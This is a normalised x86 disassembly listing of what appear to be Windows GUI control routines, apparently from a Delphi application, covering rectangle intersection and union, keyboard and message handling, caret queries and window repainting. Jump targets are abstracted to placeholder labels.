sub [ edi ] eax
or [ ebx + 0x61 ] eax
inc esp
add [ ecx + esi ] al
inc eax
push esp
inc edi
jb r-xdata
push cs
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
add al 0x52
add al cl
xor eax [ eax ]
je r-xdata
je r-xdata
outsd
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
sub_473bb8
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ esp + 0x8 ]
mov [ ecx ] eax
mov eax [ esp ]
cmp eax [ esp + 0x8 ]
jge r-xdata
mov eax [ esp ]
mov [ ecx + 0x8 ] eax
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jle r-xdata
mov [ ecx ] eax
mov eax [ esp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ esp + 0x4 ]
cmp eax [ esp + 0xc ]
jge r-xdata
mov [ ecx + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ ecx + 0xc ] eax
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
jle r-xdata
mov [ ecx + 0x4 ] eax
add esp 0x10
pop edi
pop esi
retn
mov [ ecx + 0xc ] eax
sub_473c58
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_473c3c
test al al
jne r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_473c3c
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov edx [ ebx ]
mov [ esi ] edx
mov edx [ ebx + 0x4 ]
mov [ esi + 0x4 ] edx
xor eax eax
jmp r-xdata
test al al
je r-xdata
sub_473ca4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax edi
call sub_473c58
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_473c58
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0xc ]
push eax
lea edx [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
call sub_473c58
pop ecx
test al al
jne r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0xc ] edx
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0xc ] edx
jmp r-xdata
sub_473d1c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax ebx
xor ecx ecx
mov edx 0x40
call sub_402b80
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call UnionRect
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x28 ]
call sub_416a38
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x28 ]
call sub_416a38
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x28 ]
call sub_416a38
lea edx [ ebp - 0x40 ]
mov eax ebx
pop ecx
call sub_473ca4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov esi eax
mov edi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov esi eax
lea edi [ ebx + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
call sub_416a38
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x10 ]
call sub_416a38
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x18 ]
call sub_416a38
lea edx [ ebp - 0x40 ]
lea eax [ ebx + 0x10 ]
pop ecx
call sub_473ca4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebx + 0x8 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_416a38
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_416a38
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x20 ]
call sub_416a38
lea edx [ ebp - 0x40 ]
lea eax [ ebx + 0x20 ]
pop ecx
call sub_473ca4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebx + 0x1c ] eax
push ebp
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_416a38
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
call sub_416a38
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x28 ]
call sub_416a38
lea edx [ ebp - 0x40 ]
lea eax [ ebx + 0x30 ]
pop ecx
call sub_473ca4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebx + 0x20 ] eax
mov eax [ ebp - 0xc ]
mov [ ebx + 0x34 ] eax
sub_473eac
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_473f8b
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473f92
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403f64
retn
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov esi [ eax ]
xor esi esi
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov eax [ ebp - 0x8 ]
call sub_473ba0
cmp esi [ ebp - 0x4 ]
jge r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
cmp esi 0x7fffffe
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d94
mov eax [ ebp - 0xc ]
call sub_473ba0
jmp r-xdata
add edi esi
mov esi edi
test esi esi
jge r-xdata
test esi esi
jle r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d94
mov eax [ ebp - 0x10 ]
call sub_473ba0
mov edx esi
shl edx 0x2
mov eax ebx
call sub_40271c
cmp [ ebx ] 0x0
je r-xdata
inc esi
mov eax [ ebp - 0x4 ]
inc eax
cmp esi eax
jle r-xdata
dec esi
mov eax [ ebx ]
mov [ eax ] esi
mov edx [ ebx ]
mov ecx [ ebp + 0x8 ]
mov [ edx + eax * 4 ] ecx
inc eax
cmp esi eax
jg r-xdata
sub_473f9c
push ebx
push esi
xor esi esi
cmp [ eax ] 0x0
je r-xdata
push ecx
mov ecx edx
sub ecx esi
mov edx esi
call sub_473eac
pop esi
pop ebx
retn
mov ebx [ eax ]
mov esi [ ebx ]
sub_473fb8
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebx eax
cmp [ ebx ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx ]
mov edi [ eax + edx * 4 ]
cmp esi edx
jle r-xdata
cmp esi edx
jge r-xdata
mov eax esi
sub eax edx
mov ecx eax
shl ecx 0x2
mov eax [ ebx ]
lea eax [ eax + edx * 4 + 0x4 ]
mov ebp [ ebx ]
lea edx [ ebp + edx * 4 ]
call sub_4028d8
jmp r-xdata
mov eax [ ebx ]
mov [ eax + esi * 4 ] edi
mov eax [ ebx ]
lea eax [ eax + esi * 4 ]
mov ecx [ ebx ]
lea ecx [ ecx + esi * 4 + 0x4 ]
sub edx esi
shl edx 0x2
xchg edx ecx
call sub_4028d8
sub_474010
push ebx
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
test edi edi
sete dl
test edi edi
je r-xdata
mov eax edx
pop edi
pop esi
pop ebx
retn
mov esi [ eax ]
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
inc esi
xor ecx ecx
inc ecx
dec esi
jne r-xdata
mov ebx [ eax + ecx * 4 ]
cmp ebx [ edi + ecx * 4 ]
jne r-xdata
sub_47404c
push ebx
push esi
add esp 0xffffffe4
mov ebx edx
mov esi eax
xor eax eax
mov [ esp + 0x4 ] eax
push 0x1
push ebx
push ebx
push esi
lea eax [ esp + 0x10 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
add esp 0x1c
pop esi
pop ebx
retn
cmp [ esp + 0x4 ] 0x12
jne r-xdata
mov eax [ esp + 0x8 ]
push eax
call PostQuitMessage
sub_474088
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4706a8
xor edx edx
mov eax esi
call sub_4465c0
xor edx edx
mov eax esi
call sub_446590
xor edx edx
mov eax esi
call sub_446684
xor edx edx
mov eax esi
call sub_4360dc
mov [ esi + 0x1f8 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_474104
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x240 ]
test [ eax + 0x249 ] 0x8
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x2
sub_47412c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_470b9c
sub_47414c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_47416c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_470b68
sub_4741a0
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x1 ] dl
lea edx [ ebp - 0x9 ]
push edx
mov dl [ ebp - 0x1 ]
mov eax [ eax + 0x240 ]
mov si 0xffe2
call sub_403368
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_4741e8
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0x9 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x240 ]
mov si 0xffbc
call sub_403368
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax ] 0x0
pop esi
pop ebp
retn
sub_47421c
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x240 ]
mov edx [ eax + 0x1d8 ]
mov [ ebp - 0x8 ] edx
mov edx [ eax + 0x1dc ]
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov dl [ edx - 0x9 ]
push edx
mov edx [ ebp + 0x8 ]
mov ecx [ edx - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
sub_474290
push ebp
mov ebp esp
push ebx
mov ebx eax
lea eax [ ebx + 0x4 ]
push eax
push ebx
push 0xb0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_446450
push eax
call SendMessageA
pop ebx
pop ebp
retn
sub_4742b4
push ebp
mov ebp esp
add esp 0xfffffff8
lea eax [ ebp - 0x8 ]
push eax
call GetCaretPos
mov dx [ ebp - 0x4 ]
mov ax [ ebp - 0x8 ]
call sub_406c74
push eax
push 0x0
push 0xd7
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_446450
push eax
call SendMessageA
pop ecx
pop ecx
pop ebp
retn
sub_4742f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
call sub_474290
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_470980
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
call sub_4742b4
pop ecx
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ ebp - 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_470980
cmp eax [ ebp - 0x4 ]
je r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov al 0x1
sub_474348
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
call sub_474290
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_4742b4
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_470980
cmp ebx eax
je r-xdata
sub_474394
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
cmp eax 0x26
jg r-xdata
cmp eax 0x2d
jg r-xdata
je r-xdata
sub eax 0x2e
je r-xdata
je r-xdata
push ebp
call sub_4741e8
pop ecx
jmp r-xdata
cmp eax 0x23
jg r-xdata
push ebp
call sub_474280
pop ecx
test al al
je r-xdata
sub eax 0x43
je r-xdata
mov al [ r-xdata ]
cmp al [ ebp - 0x9 ]
jne r-xdata
sub eax 0x27
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x24
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov si 0xffb0
call sub_403368
test al al
jne r-xdata
push ebp
call sub_4741e8
pop ecx
jmp r-xdata
push ebp
call sub_47421c
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x71
jne r-xdata
jmp r-xdata
mov al [ r-xdata ]
cmp al [ ebp - 0x9 ]
jne r-xdata
push ebp
call sub_4741e8
pop ecx
jmp r-xdata
push ebp
call sub_474264
pop ecx
test al al
je r-xdata
dec eax
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebp
call sub_47421c
pop ecx
mov edx [ ebp - 0x8 ]
mov cl [ ebp - 0x9 ]
mov eax [ ebp - 0x4 ]
call sub_4706fc
push ebp
call sub_474264
pop ecx
test al al
je r-xdata
dec eax
je r-xdata
push ebp
call sub_474264
pop ecx
test al al
je r-xdata
sub eax 0x9
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
call sub_474740
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov si 0xffb0
call sub_403368
test al al
jne r-xdata
push ebp
call sub_474280
pop ecx
test al al
jne r-xdata
jmp r-xdata
push ebp
call sub_474280
pop ecx
test al al
jne r-xdata
push ebp
call sub_474264
pop ecx
test al al
je r-xdata
jmp r-xdata
push ebp
call sub_474280
pop ecx
test al al
jne r-xdata
test [ ebp - 0x9 ] 0x2
jne r-xdata
sub eax 0x12
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
push ebp
call sub_4741e8
pop ecx
jmp r-xdata
push ebp
call sub_4742f0
pop ecx
test al al
je r-xdata
push ebp
call sub_4741e8
pop ecx
jmp r-xdata
push ebp
call sub_474348
pop ecx
test al al
je r-xdata
push ebp
call sub_474280
pop ecx
test al al
jne r-xdata
push ebp
call sub_4741e8
pop ecx
jmp r-xdata
push ebp
call sub_4742f0
pop ecx
test al al
je r-xdata
push ebp
call sub_4741e8
pop ecx
jmp r-xdata
add eax 0xfffffffa
sub eax 0x2
jb r-xdata
push ebp
call sub_4741e8
pop ecx
jmp r-xdata
push ebp
call sub_474348
pop ecx
test al al
je r-xdata
jmp r-xdata
sub_4745c1
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
mov edx ebx
mov eax [ edi + 0x240 ]
mov si 0xffba
call sub_403368
mov al [ ebx ]
add al 0xe0
sub al 0xe0
jae r-xdata
xor eax eax
mov al [ ebx ]
cmp eax 0x16
jg r-xdata
mov dl [ ebx ]
mov eax [ edi + 0x240 ]
mov si 0xffb2
call sub_403368
test al al
jne r-xdata
sub eax 0x18
je r-xdata
je r-xdata
mov [ ebx ] 0x0
push 0x0
call MessageBeep
mov eax [ edi + 0x240 ]
mov si 0xffb0
call sub_403368
test al al
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x8
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov [ ebx ] 0x0
mov [ ebx ] 0x0
jmp r-xdata
add eax 0xfffffffb
sub eax 0xe0
jb r-xdata
dec eax
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
call sub_47082c
jmp r-xdata
sub eax 0x4
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax edi
call sub_446450
push eax
call SendMessageA
cmp [ esp ] 0x0
jne r-xdata
jmp r-xdata
mov eax edi
call sub_436314
mov eax edi
call sub_470980
cmp eax [ esp + 0x4 ]
jne r-xdata
mov eax edi
call sub_474740
jmp r-xdata
mov [ ebx ] 0x0
jmp r-xdata
sub_4746c8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ esi ]
sub eax 0x7
je r-xdata
mov eax ebx
call sub_457570
test eax eax
je r-xdata
sub eax 0x1fa
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
mov eax ebx
call sub_457570
mov edx [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
call GetMessageTime
mov edi eax
sub edi [ ebx + 0x244 ]
call GetDoubleClickTime
cmp edi eax
jae r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x244 ] eax
mov [ esi ] 0x203
mov edx esi
mov eax ebx
call sub_443de0
sub_474760
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
mov eax ebx
call sub_446450
push eax
call ValidateRect
push 0xffffffff
push 0x0
mov eax ebx
call sub_446450
push eax
call InvalidateRect
push esp
mov eax ebx
call sub_446450
push eax
call GetClientRect
push 0x2
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x240 ]
call sub_446450
push eax
mov eax ebx
call sub_446450
push eax
call MapWindowPoints
push esp
mov eax [ ebx + 0x240 ]
call sub_446450
push eax
call ValidateRect
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x240 ]
call sub_446450
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_4747e4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_446754
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_446450
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_474760
push 0x8c
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_446450
push eax
call SetWindowPos
mov eax ebx
mov si 0xffb5
call sub_403368
test al al
je r-xdata
mov eax [ ebx + 0x240 ]
call sub_446450
push eax
call SetFocus
sub_47484c
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
push esi
call IsRectEmpty
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x94 ]
test bl bl
jne r-xdata
mov eax edi
call sub_4747e4
jmp r-xdata
mov al 0x1
mov eax edi
call sub_446450
push eax
call IsWindowVisible
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x240 ]
mov si 0xffb5
call sub_403368
test al al
je r-xdata
mov eax edi
call sub_474760
xor eax eax
jmp r-xdata
mov eax edi
call sub_446450
push eax
call SetFocus
mov ebx eax
mov eax edi
call sub_474760
push 0x48
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
push eax
mov eax [ esi + 0x8 ]
mov ebp [ esi ]
sub eax ebp
push eax
mov eax [ esi + 0x4 ]
push eax
push ebp
push 0x0
mov eax edi
call sub_446450
push eax
call SetWindowPos
mov eax edi
mov edx [ eax ]
call [ edx + 0xfc ]
test bl bl
je r-xdata
sub_4748fc
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
sub ecx 0x2
mov edx 0x2
mov eax 0x2
call sub_416a60
mov eax esp
push eax
push 0x0
push 0xb4
mov eax ebx
call sub_446450
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_446450
push eax
call SendMessageA
add esp 0x10
pop ebx
retn
sub_474964
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_474a10
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_470a64
lea eax [ ebp - 0x4 ]
push eax
mov edi [ ebx + 0x240 ]
mov ecx [ edi + 0x22c ]
mov edx [ edi + 0x228 ]
mov eax edi
mov si 0xffac
call sub_403368
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_470d58
lea eax [ ebp - 0x8 ]
push eax
mov edi [ ebx + 0x240 ]
mov ecx [ edi + 0x22c ]
mov edx [ edi + 0x228 ]
mov eax edi
mov si 0xffaf
call sub_403368
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_470a64
mov eax [ ebx + 0x240 ]
mov si 0xffad
call sub_403368
mov edx eax
mov eax ebx
call sub_470e2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474a17
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
sub_474a20
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4480d4
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
mov [ ebx + 0x219 ] 0x1
mov [ ebx + 0x21c ] 0x5
mov [ ebx + 0x24c ] 0x5
mov [ ebx + 0x238 ] 0x1
mov [ ebx + 0x23c ] 0x1
mov [ ebx + 0x244 ] 0x1
mov ax [ r-xdata ]
mov [ ebx + 0x248 ] ax
mov ax [ r-xdata ]
mov [ ebx + 0x290 ] ax
mov [ ebx + 0x240 ] 0xff00000f
mov [ ebx + 0x254 ] 0x3
mov [ ebx + 0x218 ] 0x1
mov [ ebx + 0x230 ] 0x40
mov [ ebx + 0x234 ] 0x18
mov [ ebx + 0x28c ] 0x1
mov [ ebx + 0x28f ] 0x1
mov [ ebx + 0x28d ] 0x0
mov edx 0xff000005
mov eax ebx
call sub_43fd50
xor edx edx
mov eax ebx
call sub_43fd74
mov dl 0x1
mov eax ebx
call sub_446684
mov eax [ ebx + 0x21c ]
imul [ ebx + 0x230 ]
push eax
mov eax [ ebx + 0x24c ]
imul [ ebx + 0x234 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax ebx
call sub_476fa0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_474b70
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x27c ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_448130
mov eax [ esi + 0x220 ]
call sub_4026fc
mov eax [ esi + 0x250 ]
call sub_4026fc
mov eax [ esi + 0x224 ]
call sub_4026fc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_474bc4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_474cd0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0xc ]
add eax [ edx - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax - 0x4 ] 0x0
jge r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d94
mov eax [ ebp - 0x10 ]
call sub_473ba0
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
imul esi
mov [ ebp - 0x8 ] eax
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov edx [ ebp + 0xc ]
cmp eax [ edx - 0x8 ]
jl r-xdata
push esi
mov eax [ ebp + 0xc ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0xc ]
mov edx [ eax - 0x8 ]
mov eax ebx
call sub_473eac
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp + 0xc ]
sub eax [ ecx - 0x4 ]
dec eax
sub eax edx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474cd7
lea eax [ ebp - 0x10 ]
call sub_403f40
retn
mov eax [ ebp + 0xc ]
cmp [ eax - 0x4 ] 0x0
jge r-xdata
cmp [ ebx ] 0x0
je r-xdata
inc eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0xc ]
sub eax [ edx - 0x4 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov ecx [ ebx ]
mov ecx [ ecx + edx * 4 ]
add [ ebp - 0x8 ] ecx
inc edx
dec eax
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
sub_474ce4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
